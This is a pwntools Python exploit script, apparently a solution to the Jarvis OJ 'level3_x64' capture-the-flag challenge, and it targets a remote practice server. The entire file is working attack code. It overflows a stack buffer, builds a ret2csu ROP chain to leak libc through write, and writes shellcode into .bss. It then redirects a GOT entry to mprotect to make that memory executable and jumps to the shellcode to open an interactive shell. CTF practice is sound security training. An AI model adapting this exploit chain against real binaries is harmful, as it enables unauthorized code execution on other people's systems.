from pwn import *

context(arch='amd64',os='linux')
context.log_level = "debug"

if len(sys.argv)<2:
	p = process('./level3_x64')
	elf = ELF('./level3_x64')
	libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
else:
	p = remote('pwn2.jarvisoj.com',9884)
	elf = ELF('./level3_x64')
	libc = ELF('libc-2.19.so')

def csu_gadget(retaddr,par1,par2,par3):
	csu_start = 0x00000000004006AA #csu_start:pop_rbx_rbp_r12_r13_r14_r15_ret
	csu_end = 0x0000000000400690 #csu_end:r13->rdx r14->rsi r15->rdi  call_[r12+rbx*8]
	payload = p64(csu_start)+p64(0)+p64(1)+p64(retaddr)+p64(par3)+p64(par2)+p64(par1)
	payload += p64(csu_end) 
	
	return payload

def rop(retmain,csu_ret_addr,par1,par2,par3):
	header_pad = 'A'*0x80+'junkjunk'
	payload = header_pad + csu_gadget(csu_ret_addr,par1,par2,par3) + p64(0)*7 + p64(retmain)
	p.recvuntil("Input:\n")
	#p.send(payload)
	return payload

main_addr = elf.symbols['main']
write_got = elf.got['write']
read_got = elf.got['read']
bss_addr = elf.bss()
bss_got = 0x0000000000600A48
empty_got = 0x0000000000600A48

log.info("******get libc_base")
payload1 = rop(main_addr,write_got,1,write_got,8)
p.sendline(payload1)
write_addr = u64(p.recv(8))
libc.address = write_addr - libc.symbols['write']
log.success("libc_base:"+hex(libc.address))
mprotect_addr = libc.symbols['mprotect']

log.info("******write shellcode to bss")
shellcode = asm(shellcraft.amd64.sh())
payload2 = rop(main_addr,read_got,0,bss_addr,len(shellcode))
p.send(payload2)
p.send(shellcode)

log.info("******add mprotect_addr to got table")
payload4 = rop(main_addr,read_got,0,empty_got,8)
p.send(payload4)
p.send(p64(mprotect_addr))

#gdb.attach(p,"b *0x0000000000400602")

log.info("******set bss can excute and getshell")
payload5 = rop(main_addr,empty_got,0x600000,0x1000,7)
p.send(payload5)

log.info("******add bss_addr to got table")
payload3 = rop(main_addr,read_got,0,empty_got,8)
p.send(payload3)
p.send(p64(bss_addr))

payload6 = 'a'*0x88+p64(bss_addr)
p.send(payload6)

p.interactive()

	
